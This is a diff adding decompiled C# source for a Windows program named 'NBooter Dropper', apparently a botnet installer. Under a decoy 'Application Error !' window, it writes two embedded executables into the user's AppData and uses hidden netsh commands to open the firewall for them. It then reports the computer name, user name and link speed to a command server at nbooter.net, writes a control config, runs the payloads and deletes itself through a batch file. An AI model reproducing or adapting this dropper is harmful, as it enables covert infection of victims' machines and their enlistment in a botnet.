@@ -1,0 +1,653 @@
+using System;
+using System.CodeDom.Compiler;
+using System.Collections;
+using System.ComponentModel;
+using System.ComponentModel.Design;
+using System.Configuration;
+using System.Diagnostics;
+using System.Drawing;
+using System.Globalization;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Reflection;
+using System.Resources;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Runtime.Versioning;
+using System.Threading;
+using System.Windows.Forms;
+using Microsoft.VisualBasic;
+using Microsoft.VisualBasic.ApplicationServices;
+using Microsoft.VisualBasic.CompilerServices;
+using Microsoft.VisualBasic.Devices;
+using NBooter_Dropper.My;
+using NBooter_Dropper.My.Resources;
+
+[assembly: CompilationRelaxations(8)]
+[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
+[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
+[assembly: AssemblyTitle("NBooter Dropper")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("NBooter Dropper")]
+[assembly: AssemblyCopyright("Copyright ©  2015")]
+[assembly: AssemblyTrademark("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("f90c7da9-9b6c-446c-acfd-1046b085d1d9")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
+[assembly: TargetFramework(".NETFramework,Version=v4.0,Profile=Client", FrameworkDisplayName = ".NET Framework 4 Client Profile")]
+[assembly: AssemblyVersion("1.0.0.0")]
+namespace NBooter_Dropper
+{
+ [DesignerGenerated]
+ public class Form1 : Form
+ {
+  private string SERVER;
+
+  private Thread th;
+
+  private string KEY;
+
+  private object nbooterSource;
+
+  private object superadminSource;
+
+  private string nbooterFilename;
+
+  private string superadminFilename;
+
+  private IContainer components;
+
+  public Form1()
+   : this()
+  {
+   ((Form)this).add_Load((EventHandler)Form1_Load);
+   SERVER = "http://nbooter.net";
+   KEY = "FF920T9E20334OF3";
+   nbooterSource = Resources.logonsvc;
+   superadminSource = Resources.iexplore;
+   nbooterFilename = "logonsvc.exe";
+   superadminFilename = "msqlite.exe";
+   InitializeComponent();
+  }
+
+  private void Form1_Load(object sender, EventArgs e)
+  {
+   ((Form)this).set_WindowState((FormWindowState)1);
+   try
+   {
+    th = new Thread(DoTheTricks);
+    th.Priority = ThreadPriority.BelowNormal;
+    th.Start();
+   }
+   catch (Exception ex)
+   {
+    ProjectData.SetProjectError(ex);
+    Exception ex2 = ex;
+    ProjectData.ClearProjectError();
+   }
+  }
+
+  private void DoTheTricks()
+  {
+   try
+   {
+    File.WriteAllBytes("C:/Users/" + Environment.UserName + "/AppData/" + nbooterFilename, (byte[])nbooterSource);
+    File.WriteAllBytes("C:/Users/" + Environment.UserName + "/AppData/" + superadminFilename, (byte[])superadminSource);
+    Thread.Sleep(2);
+    ProcessStartInfo processStartInfo = new ProcessStartInfo();
+    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+    processStartInfo.FileName = "CMD";
+    processStartInfo.Arguments = "netsh firewall add allowedprogram \"C:/Users/" + Environment.UserName + "/AppData/" + nbooterFilename + " \"" + nbooterFilename.ToLower().Replace(".exe", "") + "\" ENABLE";
+    Process.Start(processStartInfo);
+    ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
+    processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
+    processStartInfo2.FileName = "CMD";
+    processStartInfo2.Arguments = "netsh firewall add allowedprogram \"C:/Users/" + Environment.UserName + "/AppData/" + superadminFilename + " \"" + superadminFilename.ToLower().Replace(".exe", "") + "\" ENABLE";
+    Process.Start(processStartInfo2);
+    string text = Conversions.ToString(RandomString(8));
+    string text2 = ((ServerComputer)MyProject.Computer).get_Name() + "/" + Environment.UserName;
+    string text3 = Conversions.ToString(GetLinkSpeedMbps());
+    string contents = SERVER + "/srv/" + text + "\r\n10\r\n86400\r\nfalse";
+    File.WriteAllText("C:/Users/" + Environment.UserName + "/AppData/autoconfig.ini", contents);
+    ((HttpWebRequest)WebRequest.Create(SERVER + "/newbot/?na=" + text + "&sp=" + text3 + "&co=" + text2 + "&ke=" + KEY)).GetResponse();
+    Thread.Sleep(100);
+    Process.Start("C:/Users/" + Environment.UserName + "/AppData/" + superadminFilename);
+    Process.Start("C:/Users/" + Environment.UserName + "/AppData/" + nbooterFilename);
+    string contents2 = "@ECHO OFF\r\nping 4.5.6.7 -w 400\r\ndel \"" + Application.get_ExecutablePath() + "\"\r\nexit";
+    File.WriteAllText("C:/Users/" + Environment.UserName + "/AppData/uninstall.bat", contents2);
+    Thread.Sleep(2);
+    Process.Start(new ProcessStartInfo
+    {
+     WindowStyle = ProcessWindowStyle.Hidden,
+     FileName = "C:/Users/" + Environment.UserName + "/AppData/uninstall.bat"
+    });
+    Thread.Sleep(20);
+    Application.Exit();
+   }
+   catch (Exception ex)
+   {
+    ProjectData.SetProjectError(ex);
+    Exception ex2 = ex;
+    Application.Exit();
+    ProjectData.ClearProjectError();
+   }
+  }
+
+  private object RandomString(int length)
+  {
+   string[] array = new string[36]
+   {
+    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
+    "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
+    "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4",
+    "5", "6", "7", "8", "9", "0"
+   };
+   string text = "";
+   VBMath.Randomize();
+   Random random = new Random();
+   checked
+   {
+    for (int i = 0; i <= length; i++)
+    {
+     int num = random.Next(0, array.Length - 1);
+     text += array[num];
+    }
+    return text;
+   }
+  }
+
+  private object GetLinkSpeedMbps()
+  {
+   string result = "";
+   try
+   {
+    NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
+    object obj = null;
+    int num = allNetworkInterfaces.Count();
+    for (int i = 0; i <= num; i = checked(i + 1))
+    {
+     if (!allNetworkInterfaces[i].Speed.ToString().StartsWith("-") & (allNetworkInterfaces[i].Speed != 0))
+     {
+      obj = allNetworkInterfaces[i].Speed;
+      break;
+     }
+    }
+    if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, (object)null, false))))
+    {
+     result = Conversions.ToString(Operators.ConcatenateObject(Operators.DivideObject(obj, (object)1000000), (object)" Mbps"));
+     return result;
+    }
+    return result;
+   }
+   catch (Exception ex)
+   {
+    ProjectData.SetProjectError(ex);
+    Exception ex2 = ex;
+    ProjectData.ClearProjectError();
+    return result;
+   }
+  }
+
+  [DebuggerNonUserCode]
+  protected override void Dispose(bool disposing)
+  {
+   try
+   {
+    if (disposing && components != null)
+    {
+     components.Dispose();
+    }
+   }
+   finally
+   {
+    ((Form)this).Dispose(disposing);
+   }
+  }
+
+  [DebuggerStepThrough]
+  private void InitializeComponent()
+  {
+   ((Control)this).SuspendLayout();
+   ((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
+   ((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
+   ((Form)this).set_BackColor(Color.Black);
+   ((Control)this).set_BackgroundImageLayout((ImageLayout)3);
+   ((Form)this).set_ClientSize(new Size(516, 279));
+   ((Form)this).set_FormBorderStyle((FormBorderStyle)1);
+   ((Control)this).set_Name("Form1");
+   ((Form)this).set_ShowIcon(false);
+   ((Form)this).set_ShowInTaskbar(false);
+   ((Form)this).set_StartPosition((FormStartPosition)1);
+   ((Form)this).set_Text("Application Error !");
+   ((Form)this).set_WindowState((FormWindowState)1);
+   ((Control)this).ResumeLayout(false);
+  }
+ }
+}
+namespace NBooter_Dropper.My
+{
+ [GeneratedCode("MyTemplate", "11.0.0.0")]
+ [EditorBrowsable(EditorBrowsableState.Never)]
+ internal class MyApplication : WindowsFormsApplicationBase
+ {
+  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
+  [STAThread]
+  [DebuggerHidden]
+  [EditorBrowsable(EditorBrowsableState.Advanced)]
+  internal static void Main(string[] Args)
+  {
+   try
+   {
+    Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.get_UseCompatibleTextRendering());
+   }
+   finally
+   {
+   }
+   ((WindowsFormsApplicationBase)MyProject.Application).Run(Args);
+  }
+
+  [DebuggerStepThrough]
+  public MyApplication()
+   : this((AuthenticationMode)0)
+  {
+   ((WindowsFormsApplicationBase)this).set_IsSingleInstance(false);
+   ((WindowsFormsApplicationBase)this).set_EnableVisualStyles(true);
+   ((WindowsFormsApplicationBase)this).set_SaveMySettingsOnExit(true);
+   ((WindowsFormsApplicationBase)this).set_ShutdownStyle((ShutdownMode)0);
+  }
+
+  [DebuggerStepThrough]
+  protected override void OnCreateMainForm()
+  {
+   ((WindowsFormsApplicationBase)this).set_MainForm((Form)(object)MyProject.Forms.Form1);
+  }
+ }
+}
+namespace NBooter_Dropper.My.Resources
+{
+ [StandardModule]
+ [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
+ [DebuggerNonUserCode]
+ [CompilerGenerated]
+ [HideModuleName]
+ internal sealed class Resources
+ {
+  private static ResourceManager resourceMan;
+
+  private static CultureInfo resourceCulture;
+
+  [EditorBrowsable(EditorBrowsableState.Advanced)]
+  internal static ResourceManager ResourceManager
+  {
+   get
+   {
+    if (object.ReferenceEquals(resourceMan, null))
+    {
+     resourceMan = new ResourceManager("NBooter_Dropper.Resources", typeof(Resources).Assembly);
+    }
+    return resourceMan;
+   }
+  }
+
+  [EditorBrowsable(EditorBrowsableState.Advanced)]
+  internal static CultureInfo Culture
+  {
+   get
+   {
+    return resourceCulture;
+   }
+   set
+   {
+    resourceCulture = value;
+   }
+  }
+
+  internal static byte[] iexplore => (byte[])RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("iexplore", resourceCulture));
+
+  internal static byte[] logonsvc => (byte[])RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("logonsvc", resourceCulture));
+ }
+}
+namespace NBooter_Dropper.My
+{
+ [CompilerGenerated]
+ [GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "10.0.0.0")]
+ [EditorBrowsable(EditorBrowsableState.Advanced)]
+ internal sealed class MySettings : ApplicationSettingsBase
+ {
+  private static MySettings defaultInstance = (MySettings)(object)SettingsBase.Synchronized((SettingsBase)(object)new MySettings());
+
+  private static bool addedHandler;
+
+  private static object addedHandlerLockObject = RuntimeHelpers.GetObjectValue(new object());
+
+  public static MySettings Default
+  {
+   get
+   {
+    //IL_0030: Unknown result type (might be due to invalid IL or missing references)
+    //IL_003a: Expected O, but got Unknown
+    if (!addedHandler)
+    {
+     object obj = addedHandlerLockObject;
+     ObjectFlowControl.CheckForSyncLockOnValueType(obj);
+     bool lockTaken = false;
+     try
+     {
+      Monitor.Enter(obj, ref lockTaken);
+      if (!addedHandler)
+      {
+       ((WindowsFormsApplicationBase)MyProject.Application).add_Shutdown((ShutdownEventHandler)delegate
+       {
+        if (((WindowsFormsApplicationBase)MyProject.Application).get_SaveMySettingsOnExit())
+        {
+         ((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
+        }
+       });
+       addedHandler = true;
+      }
+     }
+     finally
+     {
+      if (lockTaken)
+      {
+       Monitor.Exit(obj);
+      }
+     }
+    }
+    return defaultInstance;
+   }
+  }
+
+  public MySettings()
+   : this()
+  {
+  }
+
+  [DebuggerNonUserCode]
+  [EditorBrowsable(EditorBrowsableState.Advanced)]
+  private static void AutoSaveSettings(object sender, EventArgs e)
+  {
+   if (((WindowsFormsApplicationBase)MyProject.Application).get_SaveMySettingsOnExit())
+   {
+    ((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
+   }
+  }
+ }
+ [StandardModule]
+ [HideModuleName]
+ [DebuggerNonUserCode]
+ [CompilerGenerated]
+ internal sealed class MySettingsProperty
+ {
+  [HelpKeyword("My.Settings")]
+  internal static MySettings Settings => MySettings.Default;
+ }
+ [GeneratedCode("MyTemplate", "11.0.0.0")]
+ [EditorBrowsable(EditorBrowsableState.Never)]
+ internal class MyComputer : Computer
+ {
+  [DebuggerHidden]
+  [EditorBrowsable(EditorBrowsableState.Never)]
+  public MyComputer()
+   : this()
+  {
+  }
+ }
+ [StandardModule]
+ [HideModuleName]
+ [GeneratedCode("MyTemplate", "11.0.0.0")]
+ internal sealed class MyProject
+ {
+  [EditorBrowsable(EditorBrowsableState.Never)]
+  [MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
+  internal sealed class MyForms
+  {
+   [ThreadStatic]
+   private static Hashtable m_FormBeingCreated;
+
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   public Form1 m_Form1;
+
+   public Form1 Form1
+   {
+    get
+    {
+     m_Form1 = Create__Instance__(m_Form1);
+     return m_Form1;
+    }
+    set
+    {
+     if (value != m_Form1)
+     {
+      if (value != null)
+      {
+       throw new ArgumentException("Property can only be set to Nothing");
+      }
+      Dispose__Instance__(ref m_Form1);
+     }
+    }
+   }
+
+   [DebuggerHidden]
+   private static T Create__Instance__<T>(T Instance) where T : Form, new()
+   {
+    if (Instance == null || ((Control)Instance).get_IsDisposed())
+    {
+     if (m_FormBeingCreated != null)
+     {
+      if (m_FormBeingCreated.ContainsKey(typeof(T)))
+      {
+       throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate", new string[0]));
+      }
+     }
+     else
+     {
+      m_FormBeingCreated = new Hashtable();
+     }
+     m_FormBeingCreated.Add(typeof(T), null);
+     try
+     {
+      return new T();
+     }
+     catch (TargetInvocationException ex) when (((Func<bool>)delegate
+     {
+      // Could not convert BlockContainer to single expression
+      ProjectData.SetProjectError((Exception)ex);
+      return ex.InnerException != null;
+     }).Invoke())
+     {
+      throw new InvalidOperationException(Utils.GetResourceString("WinForms_SeeInnerException", new string[1] { ex.InnerException.Message }), ex.InnerException);
+     }
+     finally
+     {
+      m_FormBeingCreated.Remove(typeof(T));
+     }
+    }
+    return Instance;
+   }
+
+   [DebuggerHidden]
+   private void Dispose__Instance__<T>(ref T instance) where T : Form
+   {
+    ((Component)instance).Dispose();
+    instance = default(T);
+   }
+
+   [DebuggerHidden]
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   public MyForms()
+   {
+   }
+
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   public override bool Equals(object o)
+   {
+    return base.Equals(RuntimeHelpers.GetObjectValue(o));
+   }
+
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   public override int GetHashCode()
+   {
+    return base.GetHashCode();
+   }
+
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   internal new Type GetType()
+   {
+    return typeof(MyForms);
+   }
+
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   public override string ToString()
+   {
+    return base.ToString();
+   }
+  }
+
+  [EditorBrowsable(EditorBrowsableState.Never)]
+  [MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
+  internal sealed class MyWebServices
+  {
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   [DebuggerHidden]
+   public override bool Equals(object o)
+   {
+    return base.Equals(RuntimeHelpers.GetObjectValue(o));
+   }
+
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   [DebuggerHidden]
+   public override int GetHashCode()
+   {
+    return base.GetHashCode();
+   }
+
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   [DebuggerHidden]
+   internal new Type GetType()
+   {
+    return typeof(MyWebServices);
+   }
+
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   [DebuggerHidden]
+   public override string ToString()
+   {
+    return base.ToString();
+   }
+
+   [DebuggerHidden]
+   private static T Create__Instance__<T>(T instance) where T : new()
+   {
+    if (instance == null)
+    {
+     return new T();
+    }
+    return instance;
+   }
+
+   [DebuggerHidden]
+   private void Dispose__Instance__<T>(ref T instance)
+   {
+    instance = default(T);
+   }
+
+   [DebuggerHidden]
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   public MyWebServices()
+   {
+   }
+  }
+
+  [EditorBrowsable(EditorBrowsableState.Never)]
+  [ComVisible(false)]
+  internal sealed class ThreadSafeObjectProvider<T> where T : new()
+  {
+   [CompilerGenerated]
+   [ThreadStatic]
+   private static T m_ThreadStaticValue;
+
+   internal T GetInstance
+   {
+    [DebuggerHidden]
+    get
+    {
+     if (m_ThreadStaticValue == null)
+     {
+      m_ThreadStaticValue = new T();
+     }
+     return m_ThreadStaticValue;
+    }
+   }
+
+   [DebuggerHidden]
+   [EditorBrowsable(EditorBrowsableState.Never)]
+   public ThreadSafeObjectProvider()
+   {
+   }
+  }
+
+  private static readonly ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new ThreadSafeObjectProvider<MyComputer>();
+
+  private static readonly ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new ThreadSafeObjectProvider<MyApplication>();
+
+  private static readonly ThreadSafeObjectProvider<User> m_UserObjectProvider = new ThreadSafeObjectProvider<User>();
+
+  private static ThreadSafeObjectProvider<MyForms> m_MyFormsObjectProvider = new ThreadSafeObjectProvider<MyForms>();
+
+  private static readonly ThreadSafeObjectProvider<MyWebServices> m_MyWebServicesObjectProvider = new ThreadSafeObjectProvider<MyWebServices>();
+
+  [HelpKeyword("My.Computer")]
+  internal static MyComputer Computer
+  {
+   [DebuggerHidden]
+   get
+   {
+    return m_ComputerObjectProvider.GetInstance;
+   }
+  }
+
+  [HelpKeyword("My.Application")]
+  internal static MyApplication Application
+  {
+   [DebuggerHidden]
+   get
+   {
+    return m_AppObjectProvider.GetInstance;
+   }
+  }
+
+  [HelpKeyword("My.User")]
+  internal static User User
+  {
+   [DebuggerHidden]
+   get
+   {
+    return m_UserObjectProvider.GetInstance;
+   }
+  }
+
+  [HelpKeyword("My.Forms")]
+  internal static MyForms Forms
+  {
+   [DebuggerHidden]
+   get
+   {
+    return m_MyFormsObjectProvider.GetInstance;
+   }
+  }
+
+  [HelpKeyword("My.WebServices")]
+  internal static MyWebServices WebServices
+  {
+   [DebuggerHidden]
+   get
+   {
+    return m_MyWebServicesObjectProvider.GetInstance;
+   }
+  }
+ }
+}
